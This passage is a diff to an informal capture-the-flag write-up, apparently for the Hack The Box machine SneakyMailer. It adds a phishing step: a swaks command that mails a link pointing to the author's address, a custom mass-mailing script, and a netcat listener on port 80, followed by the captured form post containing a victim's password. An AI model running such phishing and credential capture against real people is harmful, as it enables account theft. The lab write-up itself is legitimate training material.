@@ -72,3 +72,12 @@ using swaks like
 swaks -to paulbyrd@sneakymailer.htb -server 10.10.10.197 -from glorialittle@sneakymailer.htb -body "http://10.10.14.117/"
 ```
 didnt work the out put was crap
+
+
+we finally created a custom shel script as in mailer.sh
+
+run that with the cla as cewlmails.txt and  listen on port 80 with nc using ```nc -vlp 80```
+
+
+once the script finishes u will get the following on the listener ``` firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt```
+
